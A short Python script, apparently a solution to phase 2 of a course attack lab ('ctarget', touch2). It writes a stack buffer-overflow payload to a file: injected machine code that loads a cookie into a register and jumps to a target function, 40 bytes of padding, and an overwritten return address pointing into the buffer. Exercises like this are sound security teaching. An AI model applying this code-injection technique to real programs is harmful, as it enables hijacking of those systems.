"""
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret
"""

f = open("./ctarget_touch2.bin", "wb")
codes = [0x48, 0xc7, 0xc7, 0xfa, 0x97, 0xb9, 0x59, 0x68, 0xec, 0x17, 0x40, 0x00, 0xc3]
for code in codes:
    f.write(int.to_bytes(code, 1, "little"))
f.write(bytes("a", encoding='ascii') * (40-len(codes)))
f.write(int.to_bytes(0x5561dca0-0x28, 8, "little"))
f.close()
